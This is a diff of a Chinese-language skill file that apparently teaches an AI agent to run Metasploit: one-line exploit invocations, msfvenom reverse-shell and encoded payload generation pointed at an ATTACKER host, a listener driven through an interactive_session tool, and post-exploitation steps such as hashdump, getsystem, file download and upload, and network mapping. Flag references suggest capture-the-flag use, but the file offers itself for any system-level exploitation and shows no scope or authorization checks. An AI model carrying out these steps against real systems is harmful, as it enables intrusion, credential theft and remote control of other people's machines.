@@ -1,20 +1,21 @@
 ---
 name: msf-oneshot
-description: "Metasploit Framework 一行式调用方法论。当需要利用操作系统级漏洞（如 EternalBlue/MS17-010）、数据库远程漏洞（如 PostgreSQL/MySQL RCE）、网络服务漏洞（SMB/RDP/FTP）、或需要生成 payload/后渗透操作时使用。MSF 拥有 2000+ exploit 模块，覆盖 Windows/Linux 操作系统、数据库、网络设备的远程利用。本技能教你用 msfconsole -x 一行式模式调用 MSF，避免交互式 CLI 的复杂性。任何涉及 metasploit、msfconsole、meterpreter、系统级 exploit、远程溢出、payload 生成的场景都应使用此技能"
+description: "Metasploit Framework 调用方法论（一行式 + 交互式）。当需要利用操作系统级漏洞（如 EternalBlue/MS17-010）、数据库远程漏洞（如 PostgreSQL/MySQL RCE）、网络服务漏洞（SMB/RDP/FTP）、需要生成 payload、启动反弹 shell handler、或后渗透操作时使用。MSF 拥有 2000+ exploit 模块，覆盖 Windows/Linux 操作系统、数据库、网络设备的远程利用。本技能同时覆盖一行式快速利用和 interactive_session 交互式操作（handler/meterpreter/后渗透）。任何涉及 metasploit、msfconsole、meterpreter、系统级 exploit、远程溢出、payload 生成、handler、后渗透的场景都应使用此技能"
 metadata:
-  tags: "metasploit,msf,msfconsole,meterpreter,exploit,eternalblue,ms17-010,payload,远程利用,操作系统漏洞,数据库漏洞,后渗透,msfvenom"
+  tags: "metasploit,msf,msfconsole,meterpreter,exploit,eternalblue,ms17-010,payload,远程利用,操作系统漏洞,数据库漏洞,后渗透,msfvenom,handler,interactive_session"
   category: "tool"
 ---
 
-# Metasploit Framework 一行式调用方法论
+# Metasploit Framework 调用方法论
 
-MSF 是交互式 CLI 工具，直接用 msfconsole 交互对 AI Agent 不友好。核心技巧：**用 `msfconsole -q -x` 一行式模式**，把所有命令串联在一条 bash 命令里执行。
+MSF 有两种调用方式，分别适合不同场景：
 
-## 使用前须知
+| 方式 | 适用场景 | 工具 |
+|------|---------|------|
+| **一行式** (`msfconsole -q -x`) | 单次 exploit、漏洞检测、msfvenom | 直接 bash 执行 |
+| **交互式** (`interactive_session`) | Handler 监听、Meterpreter 会话、后渗透 | `interactive_session` MCP 工具 |
 
-msfconsole 启动需要 10-30 秒加载模块库，这是正常现象。一行式（`-x`）命令执行完会自动退出，无法维持 session——如果需要保持 meterpreter 连接，参考 Phase 4 的 handler 模式。
-
-对于简单的 Web 漏洞（SQLi/XSS/SSRF），curl 或 python 脚本更快更直接；MSF 的核心价值在于 OS 级 exploit（EternalBlue 等）和标准化 payload 生成，这些场景下 MSF 无可替代。
+一行式适合"发射后不管"的操作——执行完自动退出。但 handler 监听和 meterpreter 后渗透需要持续交互，一行式做不到（`-x` 执行完就退出了，`&` 后台化也无法读取输出）。这时用 `interactive_session` 启动一个持久 tmux 会话，就能随时发送命令、读取输出。
 
 ## 参考资料
 
@@ -46,6 +47,8 @@ msfconsole -q -x "
   exit
 "
 ```
+
+msfconsole 启动需要 10-30 秒加载模块库，这是正常现象。
 
 ## Phase 2: 常见漏洞利用场景
 
@@ -149,61 +152,158 @@ msfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o s
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe
 ```
 
-## Phase 5: Handler 模式（接收反弹 shell）
+## Phase 5: Handler 模式（interactive_session）
 
-当 payload 需要回连时，先启动 handler：
+Handler 需要持续监听等待回连——一行式 `-x` 在执行完就退出了，无法维持监听。用 `interactive_session` 启动 msfconsole 交互会话来解决这个问题。
+
+### 典型流程：生成 payload → 启动 handler → 投递 payload → 获取 session
+
+**Step 1: 生成 payload**（一行式，Phase 4）
 
 ```bash
-# 启动 handler（后台运行）
-msfconsole -q -x "
-  use exploit/multi/handler;
-  set PAYLOAD windows/x64/meterpreter/reverse_tcp;
-  set LHOST 0.0.0.0;
-  set LPORT 4444;
-  set ExitOnSession false;
-  exploit -j
-" &
-
-# 然后触发目标执行 payload（通过其他漏洞上传并执行 shell.exe）
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o shell.exe
 ```
 
-⚠️ Handler 模式会持续运行，需要手动 `kill` 进程。
+**Step 2: 启动 handler**（交互式）
 
-## Phase 6: 后渗透基本操作
-
-获取 meterpreter session 后的常用操作（通过一行式难以完成，但可以串联基本命令）：
-
-```bash
-# 获取系统信息
-msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit; sysinfo; getuid; exit"
+```
+interactive_session(action="start", session_name="msf_handler", command="msfconsole -q")
 ```
 
-更实际的做法——直接用反弹 shell 执行命令，不依赖 meterpreter 交互：
+等待 15-20 秒让 msfconsole 加载完毕，然后配置 handler：
+
+```
+interactive_session(action="send", session_name="msf_handler", command="use exploit/multi/handler", wait=3)
+interactive_session(action="send", session_name="msf_handler", command="set PAYLOAD windows/x64/meterpreter/reverse_tcp", wait=2)
+interactive_session(action="send", session_name="msf_handler", command="set LHOST 0.0.0.0", wait=2)
+interactive_session(action="send", session_name="msf_handler", command="set LPORT 4444", wait=2)
+interactive_session(action="send", session_name="msf_handler", command="set ExitOnSession false", wait=2)
+interactive_session(action="send", session_name="msf_handler", command="exploit -j", wait=5)
+```
+
+Handler 现在在后台监听。可以随时 `read` 检查是否有 session 回连：
+
+```
+interactive_session(action="read", session_name="msf_handler")
+```
+
+**Step 3: 投递 payload**
+
+通过其他漏洞（文件上传、RCE 等）将 shell.exe 传到目标并执行。
+
+**Step 4: 确认 session**
+
+```
+interactive_session(action="send", session_name="msf_handler", command="sessions -l", wait=3)
+```
+
+看到 `meterpreter` session 建立后，进入 Phase 6 后渗透。
+
+### 快捷方式：一条 `-x` 启动 handler
+
+如果你确定只需要监听不需要后续交互，也可以用一条命令启动：
+
+```
+interactive_session(action="start", session_name="msf_handler", command="msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; set ExitOnSession false; exploit'")
+```
+
+这样省去了逐条 `send` 的步骤，但后续交互仍然通过 `send`/`read` 进行。
+
+## Phase 6: 后渗透操作（interactive_session）
+
+获取 meterpreter session 后，通过 `interactive_session` 执行后渗透命令。meterpreter 是交互式 shell，只有在持久会话中才能充分使用。
+
+### 进入 session 并收集信息
+
+```
+interactive_session(action="send", session_name="msf_handler", command="sessions -i 1", wait=3)
+interactive_session(action="send", session_name="msf_handler", command="sysinfo", wait=3)
+interactive_session(action="send", session_name="msf_handler", command="getuid", wait=3)
+interactive_session(action="send", session_name="msf_handler", command="ipconfig", wait=3)
+```
+
+### 常用后渗透操作
+
+```
+# 文件系统操作
+interactive_session(action="send", session_name="msf_handler", command="ls C:\\Users\\", wait=3)
+interactive_session(action="send", session_name="msf_handler", command="download C:\\flag.txt /tmp/flag.txt", wait=5)
+interactive_session(action="send", session_name="msf_handler", command="upload /tmp/tool.exe C:\\temp\\tool.exe", wait=5)
+
+# 凭据提取（需要 SYSTEM 权限）
+interactive_session(action="send", session_name="msf_handler", command="hashdump", wait=5)
+
+# 提权
+interactive_session(action="send", session_name="msf_handler", command="getsystem", wait=5)
+
+# 网络信息（内网渗透前置）
+interactive_session(action="send", session_name="msf_handler", command="arp", wait=3)
+interactive_session(action="send", session_name="msf_handler", command="route", wait=3)
+
+# 返回 MSF 主控台（保持 session 存活）
+interactive_session(action="send", session_name="msf_handler", command="background", wait=3)
+```
+
+### 会话管理
+
+```
+# 列出所有 sessions
+interactive_session(action="send", session_name="msf_handler", command="sessions -l", wait=3)
+
+# 切换到另一个 session
+interactive_session(action="send", session_name="msf_handler", command="sessions -i 2", wait=3)
+
+# 结束操作后关闭 MSF
+interactive_session(action="close", session_name="msf_handler")
+```
+
+### 备选方案：无需 meterpreter 的命令执行
+
+如果不需要交互式 meterpreter（只想执行一条命令拿 flag），直接生成命令执行 payload 更简单：
+
 ```bash
-# 生成直接执行命令的 payload（不需要 meterpreter）
-msfvenom -p windows/x64/exec CMD="whoami > C:\\flag.txt" -f exe -o cmd.exe
+msfvenom -p windows/x64/exec CMD="type C:\\flag.txt" -f exe -o cmd.exe
 msfvenom -p linux/x64/exec CMD="cat /flag > /tmp/result.txt" -f elf -o cmd.elf
 ```
 
-## 决策树：什么时候用 MSF？
+配合一行式 handler 即可（不需要 interactive_session）。
+
+## 决策树：一行式 vs interactive_session
 
 ```
-需要利用什么类型的漏洞？
-├─ Web 应用漏洞 (SQLi/XSS/SSRF)
-│   └→ 不用 MSF，用 curl/sqlmap/手动
+你要用 MSF 做什么？
 │
-├─ 已知 CVE + 有 nuclei 模板
-│   └→ 先试 nuclei，失败再考虑 MSF
+├─ 执行单个 exploit（EternalBlue、Tomcat upload 等）
+│   └→ 一行式 msfconsole -q -x "use ...; run; exit"
 │
-├─ OS 级漏洞 (EternalBlue/BlueKeep/PrintNightmare)
-│   └→ ✅ MSF 首选
+├─ 漏洞检测 / auxiliary scanner
+│   └→ 一行式 msfconsole -q -x "use ...; run; exit"
 │
-├─ 数据库远程利用 (有凭据)
-│   └→ ✅ MSF 方便，但也可用原生客户端
+├─ 生成 payload（msfvenom）
+│   └→ 直接 bash 调用 msfvenom，不需要 msfconsole
 │
-├─ 需要生成 payload (EXE/ELF/WAR)
-│   └→ ✅ msfvenom 首选
+├─ 启动 handler 等待反弹 shell
+│   └→ interactive_session 启动 msfconsole，配置 handler
+│      （handler 需要持续监听，一行式做不到）
 │
-└─ 后渗透/提权
-    └→ 视情况：简单命令用 shell，复杂操作考虑 meterpreter
+├─ Meterpreter 后渗透（sysinfo、hashdump、文件操作）
+│   └→ interactive_session send/read 交互
+│      （meterpreter 是交互式 shell，需要持久会话）
+│
+├─ 只想执行一条命令拿 flag（不需要交互）
+│   └→ msfvenom -p .../exec CMD="..." 生成命令执行 payload
+│      配合一行式 handler 或 nc 监听即可
+│
+└─ Web 应用漏洞 (SQLi/XSS/SSRF)
+    └→ 不用 MSF，curl/sqlmap/手动脚本更快
 ```
+
+## 常见问题排查
+
+| 症状 | 原因 | 解决 |
+|------|------|------|
+| Exploit completed, but no session | Payload 被杀/端口被占 | 换端口、换 payload、检查防火墙 |
+| Connection refused | 目标端口未开放 | 先 nmap 确认端口开放 |
+| msfconsole 启动超时 | 数据库连接慢 | 加 `--no-database` 或等待 |
+| Payload 无法回连 | LHOST 错误/防火墙 | 确认 LHOST 是目标可达的 IP |
+| interactive_session read 为空 | msfconsole 还在加载 | wait 设为 15-20 秒，重新 read |
